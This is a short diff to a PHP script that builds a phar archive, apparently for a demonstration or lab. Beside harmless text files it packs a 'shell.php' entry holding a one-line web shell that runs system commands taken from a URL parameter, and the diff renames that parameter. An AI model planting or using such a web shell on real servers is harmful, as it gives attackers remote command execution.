@@ -12,7 +12,7 @@ $p->startBuffering();
 $p['file1.txt'] = 'file1'; 
 $p['file2.txt'] = 'file2';
 $p['file3.txt'] = 'file3';
-$p['shell.php'] = '<?php system($_GET[c]); ?>';
+$p['shell.php'] = '<?php system($_GET[cmd]); ?>';
  
 // use my.phar
 echo file_get_contents('phar://my.phar/file2.txt'); // echo file2
